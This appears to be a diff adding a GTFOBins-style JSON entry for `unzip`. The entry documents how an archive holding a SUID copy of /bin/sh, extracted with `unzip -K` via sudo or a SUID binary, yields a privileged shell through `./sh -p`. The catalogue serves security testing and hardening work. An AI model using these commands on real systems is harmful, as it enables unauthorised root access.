@@ -1,0 +1,15 @@
+{
+  "description": "Certain `unzip` versions allows to preserve the SUID bit. Prepare an archive beforehand with the following commands as root:\n\n```\ncp /bin/sh .\nchmod +s sh\nzip shell.zip sh\n```\n\nExtract it on the target, then run the SUID shell as usual (omitting the `-p` where appropriate).\n",
+  "functions": {
+    "sudo": [
+      {
+        "code": "sudo unzip -K shell.zip\n./sh -p\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "./unzip -K shell.zip\n./sh -p\n"
+      }
+    ]
+  }
+}
